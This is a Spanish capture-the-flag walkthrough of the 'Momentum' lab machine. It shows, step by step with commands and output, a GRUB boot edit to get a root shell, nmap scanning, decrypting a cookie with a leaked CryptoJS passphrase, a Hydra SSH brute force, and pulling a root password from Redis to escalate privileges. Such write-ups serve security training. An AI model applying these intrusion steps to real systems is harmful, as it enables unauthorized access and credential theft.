Inicialmente la máquina no se detecta con arp-scan. Esto es porque está configurada con una interfaz de red rara.

-Para resolverlo, en el menú de arranque de grub apretamos un cursor y en la primera opción apretamos la tecla "e".

- Entramos en modo de edición de los parámetros de arranque para esa opción.
donde pone "ro quiet", ponemos "rw init=/bin/bash" para que al arrancar nos abra una shell.
- Una vez abierto el shell con permisos de root vamos a editamos /etc/interfaces y cambiamos la interfaz rara donde ponga "enp0s3" ponemos "ens33"

-----------------------------------------------------------------------

Hacemos un reconocimiento rápido de los 1000 primeros puertos:
> sudo nmap -sVS -p1-1000 -Pn 192.168.1.120 

[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-04 16:46 EST
Nmap scan report for Momentum.home (192.168.1.120)
Host is up (0.35s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 00:0C:29:26:22:0B (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.44 seconds

-----------------------------------------------------------------------
Mientras comprobamos los puertos mostrados, hacemos un reconocimiento más exhaustivo incluyendo todos los puertos.
> sudo nmap -sVS -p- -Pn 192.168.1.120

-----------------------------------------------------------------------
La primera comprobación que hacemos es mirar qué tenologías web usa la máquina víctima:
> whatweb 192.168.1.120                 

http://192.168.1.120 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.1.120], Script[text/javascript], Title[Momentum | Index]

-----------------------------------------------------------------------
inspeccionando el código de la web, vemos que se carga un script de java-script.
entramos en el directorio js dado que el servidor web permite directory listing.

http://192.168.1.120/js

y vemos que solo hay el fichero main.js. Lo abrimos y vemos su contenido:

function viewDetails(str) {

  window.location.href = "opus-details.php?id="+str;
}

/*
var CryptoJS = require("crypto-js");
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
console.log(decrypted.toString(CryptoJS.enc.Utf8));
*/
-----------------------------------------------------------------------
vemos que hay un código para desencriptar cosas. posiblemente sea necesario.

También vemos que hay uso de php, por lo que igual podemos hacer lfi con php.
-----------------------------------------------------------------------

Tras probar mil combinaciones en el campo id de la página opus-details.php y ninguna llevar a ninguna parte
abrimos la página mediante burpsuite y vemos que se está utilizando una cookie con un valor raro:


cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt; 
este podría ser un campo encriptado que se pueda desencriptar con CryptoJS
-----------------------------------------------------------------------
Nos vamos a un sitio web donde nos permitan ejecutar código JavaScript en tiempo real:
https://playcode.io/new
var encrypted = "U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt";
var CryptoJS = require("crypto-js");
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");

console.log(decrypted.toString(CryptoJS.enc.Utf8));
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
auxerre-alienum##
-----------------------------------------------------------------------
asi pues este podría ser un candidato de nombre de usuario o password.
auxerre-alienum##

-----------------------------------------------------------------------
tras probar combinaciones entre momentum, auxerre, auxerre-alienum## y SecretPassphraseMomentum
no obtengo ningún resultado, pero hago una prueba.
Creo un diccionario con las sieguiente entradas:

cat possible_users.txt                      
───────┬─────────────────────────────────────────────────────────────────────────
       │ File: possible_users.txt
───────┼─────────────────────────────────────────────────────────────────────────
   1   │ momentum
   2   │ SecretPassphraseMomentum
   3   │ auxerre-alienum
   4   │ auxerre-alienum##
   5   │ auxerre
   6   │ alienum

   
-----------------------------------------------------------------------

Hago una prueba con Hydra para ver si alguna de esas combinaciones es válida:
>hydra -L possible_users.txt -P possible_users.txt 192.168.1.120 ssh -t 4  

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-05 18:02:00
[DATA] max 4 tasks per 1 server, overall 4 tasks, 36 login tries (l:6/p:6), ~9 tries per task
[DATA] attacking ssh://192.168.1.120:22/
[22][ssh] host: 192.168.1.120   login: auxerre   password: auxerre-alienum##
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-05 18:02:27

y soprendentemente encuentra una combinación válida!
-----------------------------------------------------------------------
Así entramos en la máquina con ssh y vamos al directorio home del usuario auxerre.
> sshpass -p "auxerre-alienum##" ssh -o StrictHostKeyChecking=no auxerre@192.168.1.120

Linux Momentum 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jan  5 18:03:15 2023 from 192.168.1.79
auxerre@Momentum:~$ ls -la
total 32
drwxr-xr-x 3 auxerre auxerre 4096 Apr 22  2021 .
drwxr-xr-x 3 root    root    4096 Apr 19  2021 ..
-rw------- 1 auxerre auxerre   21 Jan  5 18:09 .bash_history
-rw-r--r-- 1 auxerre auxerre  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 auxerre auxerre 3526 Apr 19  2021 .bashrc
-rw-r--r-- 1 auxerre auxerre  807 Apr 19  2021 .profile
drwx------ 2 auxerre auxerre 4096 Apr 21  2021 .ssh
-rwx------ 1 auxerre auxerre  146 Apr 22  2021 user.txt

auxerre@Momentum:~$ cat user.txt 
[ Momentum - User Owned ]
---------------------------------------
flag : 84157165c30ad34d18945b647ec7f647
---------------------------------------
Si hacemos sudo -l el resultado es:

> sudo -l
bash: sudo: command not found

Es decir no tiene el comando sudo.
----------------------------------------------------------------------------

Miramos qué ficheros se pueden ejecutar con privilegios:
> auxerre@Momentum:~$ find / -perm /4000 2>/dev/null

/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign

a priori no parece que se pueda hacer nada. He probadp con newgrp y con ssh-keysign 
y de momento nada. Volveremos a esta lista más adelante si es necesario.
----------------------------------------------------------------------------
Probamos a mirar qué ficheros son escribibles por el usuario:


Miramos qué ficheros tienen capabilities explotables:
>getcap -r / 2>/dev/null 

sin resultados.
----------------------------------------------------------------------------

miramos qué procesos se están ejecutando en la máquina
> ps -faux:
root       537  0.0  0.0   5612  1556 tty1     Ss+  16:01   0:00 /sbin/agetty -o -p -- \u --
redis      552  0.1  0.6  60888 12488 ?        Ssl  16:01   0:11 /usr/bin/redis-server 127.0.0.1:6329
root       556  0.0  0.3  15852  6676 ?        Ss   16:01   0:00 /usr/sbin/sshd -D
root      1796  0.0  0.3  16928  7948 ?        Ss   18:24   0:00  \_ sshd: auxerre [priv]
auxerre   1808  0.0  0.2  16928  4884 ?        S    18:24   0:00      \_ sshd: auxerre@pts/0
auxerre   1809  0.0  0.2   7764  4552 pts/0    Ss   18:24   0:00          \_ -bash
auxerre   1875  0.0  0.1  11076  3652 pts/0    R+   19:01   0:00              \_ ps -faux
root       605  0.0  0.6  57544 13472 ?        Ss   16:01   0:00 /usr/sbin/apache2 -k start
www-data   608  0.0  0.4  57852  8848 ?        S    16:01   0:00  \_ /usr/sbin/apache2 -k st

-------------------------------------------------------------------------------------------
Vemos que hay un proceso raro llamado redis-server que está trabajando sobre un puerto:
/usr/bin/redis-server 127.0.0.1:6329

Así que miramos qué hace Redist. Por lo visto entre muchas otras cosas, es como una base de 
datos de registro (como el de windows, pero de propósito general)

Vemos que se puede interactuar utilizando el comando:
> redist-cli

Y nos aparece una especie de intérprete de comandos.

Miramos los comandos de esto y con SELECT seleccionamos la base de datos y 
con DBSIZE nos da el número de entries en la DB

127.0.0.1:6379> SELECT 0
OK
127.0.0.1:6379> DBSIZE
(integer) 1
127.0.0.1:6379> SELECT 1
OK
127.0.0.1:6379[1]> DBSIZE 
(integer) 0
127.0.0.1:6379[1]> SELECT 2
OK
127.0.0.1:6379[2]> DBSIZE 
(integer) 0

Nos damos cuenta de que la base de datos 0 tiene una entrada y el resto 0, 
así que miramos como inspeccionar la base de datos 0.

127.0.0.1:6379> KEYS
(error) ERR wrong number of arguments for 'keys' command

Probamos con * porque nos pide un patrón:
127.0.0.1:6379> KEYS *
1) "rootpass"

Miramos como extraer el campo de la base de datos y hay un comando que se llama DUMP
127.0.0.1:6379> DUMP rootpass
"\x00\x12m0mentum-al1enum##\t\x00\xc1\xdfG$\x93\xba\x9eo"

-----------------------------------------------------------------------------

> su root
Password: m0mentum-al1enum##

-----------------------------------------------------------------------------

root@Momentum:/home/auxerre# ls -la
total 36
drwxr-xr-x 3 auxerre auxerre 4096 Jan  6 18:19 .
drwxr-xr-x 3 root    root    4096 Apr 19  2021 ..
-rw------- 1 auxerre auxerre 2482 Jan  6 18:23 .bash_history
-rw-r--r-- 1 auxerre auxerre  220 Apr 19  2021 .bash_logout
-rw-r--r-- 1 auxerre auxerre 3526 Apr 19  2021 .bashrc
-rw-r--r-- 1 auxerre auxerre  807 Apr 19  2021 .profile
-rw------- 1 auxerre auxerre  338 Jan  6 18:51 .rediscli_history
drwx------ 2 auxerre auxerre 4096 Apr 21  2021 .ssh
-rwx------ 1 auxerre auxerre  146 Apr 22  2021 user.txt
root@Momentum:/home/auxerre# cat user.txt 
[ Momentum - User Owned ]
---------------------------------------
flag : 84157165c30ad34d18945b647ec7f647
---------------------------------------
root@Momentum:/home/auxerre# 

